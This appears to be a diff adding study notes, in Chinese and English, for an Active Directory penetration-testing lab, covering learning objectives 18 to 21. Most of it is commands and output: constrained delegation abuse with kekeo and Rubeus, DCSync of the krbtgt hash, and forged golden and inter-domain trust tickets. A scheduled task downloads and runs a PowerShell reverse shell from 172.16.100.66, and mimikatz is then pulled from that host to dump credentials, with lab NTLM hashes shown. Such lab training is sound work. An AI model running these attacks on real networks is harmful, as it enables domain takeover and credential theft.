@@ -1896,3 +1896,664 @@ Cached Tickets: (1)
 ```
 PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+
+
+# Learning Objective 18:
+Task
+● Enumerate users in the domain for whom Constrained Delegation is enabled.
+− For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
+− Pass the ticket and access the service.
+● Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
+− For such a user, request a TGT from the DC.
+− Obtain an alternate TGS for LDAP service on the target machine.
+− Use the TGS for executing DCSync attack.
+
+
+约束委派
+
+## Enumerate users in the domain for whom Constrained Delegation is enabled.
+
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Get-DomainUser –TrustedToAuth
+
+
+logoncount               : 13
+badpasswordtime          : 12/31/1600 4:00:00 PM
+distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : web svc
+lastlogontimestamp       : 4/23/2020 9:31:35 AM
+userprincipalname        : websvc
+name                     : web svc
+objectsid                : S-1-5-21-1874506631-3219952063-538504511-1113
+samaccountname           : websvc
+codepage                 : 0
+samaccounttype           : USER_OBJECT
+accountexpires           : NEVER
+countrycode              : 0
+whenchanged              : 4/23/2020 4:31:35 PM
+instancetype             : 4
+usncreated               : 14488
+objectguid               : 8862b451-0bc9-4b26-8ffb-65c803cc74e7
+sn                       : svc
+lastlogoff               : 12/31/1600 4:00:00 PM
+msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
+serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
+givenname                : web
+lastlogon                : 4/23/2020 9:31:35 AM
+badpwdcount              : 0
+cn                       : web svc
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated              : 2/17/2019 1:01:06 PM
+primarygroupid           : 513
+pwdlastset               : 2/17/2019 5:01:06 AM
+usnchanged               : 425978
+```
+
+留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统
+
+由于我们之前已经枚举到了websvc的ntml哈希,这里直接利用
+
+```
+websvc：cc098f204c5887eaa8253e7c2749156f
+```
+
+## For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
+## Pass the ticket and access the service.
+
+### 方法一：kekeo.exe
+使用kekeo的 tgt::ask模块，向websvc请求一个TGT
+```
+PS C:\ad> .\kekeo.exe
+
+  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
+ /   ('>-  "A La Vie, A L'Amour"
+ | K  |    /* * *
+ \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
+                                             with  9 modules * * */
+
+kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
+Realm        : dollarcorp.moneycorp.local (dollarcorp)
+User         : websvc (websvc)
+CName        : websvc   [KRB_NT_PRINCIPAL (1)]
+SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
+Need PAC     : Yes
+Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): cc098f204c5887eaa8253e7c2749156f
+[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
+[kdc] addr: 172.16.2.1 (auto)
+  > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+```
+
+现在我们有了TGT，向dcorp-mssql请求一个TGS。需要注意，这个TGS只有进入系统的权限，不能执行系统命令
+
+```
+kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+Ticket  : TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+  [krb-cred]     E: [00000012] aes256_hmac
+  [enc-krb-cred] P: websvc @ DOLLARCORP.MONEYCORP.LOCAL
+  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+  [enc-krb-cred] T: [2/22/2022 12:03:49 AM ; 2/22/2022 10:03:49 AM] {R:3/1/2022 12:03:49 AM}
+  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): ba7c5fa059dd40fb86b20309fb226e1bad3e1f8180f09e8995825f0f1df4ba65
+  [s4u2self]  Administrator@dollarcorp.moneycorp.local
+[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
+[kdc] addr: 172.16.2.1 (auto)
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+Service(s):
+  [s4u2proxy] cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+```
+
+生成了一个TGS，使用Invoke-Mimikatz注入到内存当中
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+
+* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
+```
+
+查看dcorp-mssql，看是否能列出文件列表（因为我们只有查看文件的权限）
+```
+PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+
+    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/16/2016   6:18 AM                PerfLogs
+d-r---        2/17/2019   5:19 AM                Program Files
+d-----        2/17/2019   5:17 AM                Program Files (x86)
+d-----        8/21/2020   4:24 AM                Transcripts
+d-r---        2/17/2019   5:21 AM                Users
+d-----        8/20/2020   4:02 AM                Windows
+```
+
+### 方法二：Rubeus.exe
+
+使用rebuse滥用约束委托，可以在一条命令里请求TGT和TGS
+
+```
+.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
+```
+
+查看dcorp-mssql的C盘,证明已经有进入dcorp-mssql的权限
+```
+PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+
+    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/16/2016   6:18 AM                PerfLogs
+d-r---        2/17/2019   5:19 AM                Program Files
+d-----        2/17/2019   5:17 AM                Program Files (x86)
+d-----        8/21/2020   4:24 AM                Transcripts
+d-r---        2/17/2019   5:21 AM                Users
+d-----        8/20/2020   4:02 AM                Windows
+```
+
+## Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
+
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Get-DomainComputer –TrustedToAuth
+
+
+logoncount                    : 155
+badpasswordtime               : 2/18/2019 6:39:39 AM
+distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+badpwdcount                   : 0
+lastlogontimestamp            : 2/21/2022 1:05:29 PM
+objectsid                     : S-1-5-21-1874506631-3219952063-538504511-1114
+samaccountname                : DCORP-ADMINSRV$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : MACHINE_ACCOUNT
+countrycode                   : 0
+cn                            : DCORP-ADMINSRV
+accountexpires                : NEVER
+whenchanged                   : 2/21/2022 9:05:29 PM
+instancetype                  : 4
+usncreated                    : 14594
+objectguid                    : eda89f4e-dfec-429a-8b78-fe55624b85c9
+operatingsystem               : Windows Server 2016 Standard
+operatingsystemversion        : 10.0 (14393)
+lastlogoff                    : 12/31/1600 4:00:00 PM
+msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata         : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
+serviceprincipalname          : {TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local, WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local...}
+lastlogon                     : 2/22/2022 12:18:36 AM
+iscriticalsystemobject        : False
+usnchanged                    : 632076
+useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated                   : 2/17/2019 1:24:51 PM
+primarygroupid                : 515
+pwdlastset                    : 4/15/2019 8:55:19 AM
+msds-supportedencryptiontypes : 28
+name                          : DCORP-ADMINSRV
+dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local
+
+```
+
+只有一台计算机：DCORP-ADMINSRV$
+
+注意```msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}```
+
+由于前面我们已经枚举到DCORP-ADMINSRV$的哈希，这里我们直接使用
+```
+DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
+```
+
+
+## For such a user, request a TGT from the DC.
+## Obtain an alternate TGS for LDAP service on the target machine.
+## Use the TGS for executing DCSync attack.
+
+
+### 方法一：kekeo.exe
+
+请求TGT
+```
+PS C:\ad> .\kekeo.exe
+
+  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
+ /   ('>-  "A La Vie, A L'Amour"
+ | K  |    /* * *
+ \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
+                                             with  9 modules * * */
+
+kekeo # tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
+Realm        : dollarcorp.moneycorp.local (dollarcorp)
+User         : DCORP-ADMINSRV$ (DCORP-ADMINSRV$)
+CName        : DCORP-ADMINSRV$  [KRB_NT_PRINCIPAL (1)]
+SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
+Need PAC     : Yes
+Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5e77978a734e3a7f3895fb0fdbda3b96
+[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
+[kdc] addr: 172.16.2.1 (auto)
+  > Ticket in file 'TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+```
+
+
+已生成一个TGT，下面命令生成一个TGS
+
+```
+kekeo # tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.m
+AL
+Ticket  : TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
+  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+  [krb-cred]     E: [00000012] aes256_hmac
+  [enc-krb-cred] P: DCORP-ADMINSRV$ @ DOLLARCORP.MONEYCORP.LOCAL
+  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+  [enc-krb-cred] T: [2/22/2022 12:22:42 AM ; 2/22/2022 10:22:42 AM] {R:3/1/2022 12:22:42 AM}
+  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 4b01473a0d501079fdc42ad4d9d491e7e9ccfb16d114ccdcc2537c8d8a9aa0b0
+  [s4u2self]  Administrator@dollarcorp.moneycorp.local
+[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
+[kdc] addr: 172.16.2.1 (auto)
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
+Service(s):
+  [s4u2proxy] TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL
+  [s4u2proxy] Alternative ServiceName: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
+  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi'
+```
+
+
+已生成一个TGS
+
+下面命令利用mimikatz导入到内存中
+```
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
+```
+执行
+```
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp
+.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARC
+ORP.MONEYCORP.LOCAL_ALT.kirbi
+
+* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirb
+i': OK
+```
+已把TGS导入内存
+
+klist查看
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x2a582
+
+Cached Tickets: (3)
+
+#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 2/15/2022 7:55:59 (local)
+        End Time:   2/15/2022 17:53:59 (local)
+        Renew Time: 2/22/2022 7:53:59 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+(略)
+```
+
+
+执行dcsync，导出dcorp\krbtgt的NTML哈希
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+执行
+```
+PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
+[DC] 'dollarcorp.moneycorp.local' will be the domain
+[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
+[DC] 'dcorp\krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 2/16/2019 11:01:46 PM
+Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
+    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
+    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2
+```
+
+
+### 方法二：Rubeus.exe
+
+用Rubeus.exe可以一条命令生成TGT和TGS
+
+```
+.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
+```
+
+klist查看
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x2a582
+
+Cached Tickets: (5)
+
+#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 2/15/2022 8:06:47 (local)
+        End Time:   2/15/2022 18:06:46 (local)
+        Renew Time: 2/22/2022 8:06:46 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+使用Mimikatz执行dcsync导出dcorp\krbtgt的哈希
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+
+# Learning Objective 19:
+Task
+● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
+
+
+## 子域到父域 （一）(CIFS，访问文件系统)
+
+假设已经知道DA管理员Administrator的哈希
+```
+Administrator: af0686cc0ca8f04df42210c9ac980760
+```
+打开一个具有DA权限的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+在DA权限的shell下枚举所有Trust tikets
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
+        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
+        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
+        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
+```
+
+伪造一条到父域```moneycorp.local```的TGT
+
+从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```
+
+这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
+```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值
+
+不能使用Administrator的NTML
+
+伪造TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
+```
+
+
+TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```
+
+制作一张可以访问父域moneycorp.local的TGS
+
+```
+PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+
+  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Ticket    : C:\AD\kekeo_old\trust_tkt.kirbi
+Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
+Principal : Administrator @ dollarcorp.moneycorp.local
+
+> CIFS/mcorp-dc.moneycorp.local
+  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
+```
+
+将 TGS 呈现给目标服务
+
+```
+PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+
+  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Destination : Microsoft LSA API (multiple)
+ < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
+ > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
+```
+
+现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
+```
+ls \\mcorp-dc.moneycorp.local\c$
+```
+
+### 方法2 （Rubeus.exe）
+样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试
+
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+
+执行完成以后，访问父域的文件系统
+
+```
+ls \\mcorp-dc.moneycorp.local\c$
+```
+
+
+# Learning Objective 20:
+Task
+● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to
+the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+
+## 子域到父域 （二）(以用户身份访问，可以执行shell)
+
+这里貌似只能使用krbtgt的账号
+
+下面命令制作一张用户krbtgt到父域的TGT
+由于之前我们已经拿到了krbtgt的hash值，这里直接使用
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-1874506631-3219952063-538504511
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
+ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
+Lifetime  : 2/16/2022 12:30:00 AM ; 2/14/2032 12:30:00 AM ; 2/14/2032 12:30:00 AM
+-> Ticket : C:\AD\krbtgt_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+```
+
+TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```
+
+下面命令把TGT注入到mimikatz中
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
+```
+
+使用下面两个命令之一验证上面操作是否成功
+```
+gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+```
+或者
+```
+ls \\mcorp-dc.moneycorp.local\c$
+```
+
+利用上面已经取得的权限，为mcorp-dc添加一个定时任务
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+触发定时任务
+```
+schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
+```
+
+收到反弹shell
+```
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.1.1] 59665
+
+
+Windows PowerShell running as user MCORP-DC$ on MCORP-DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+mcorp-dc
+PS C:\Windows\system32>
+```
+
+记得byopass AMSI
+
+在mcorp-dc，把mimikatz从远程服务器导入到内存中
+```
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+
+dump出mcorp-dc中的所有用户的哈希
+
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+
+# Learning Objective 21:
+Task
+● With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
+
+跨林访问
+
+用Administrator打开一个DA的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+枚举dcorp-dc的所有trust
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
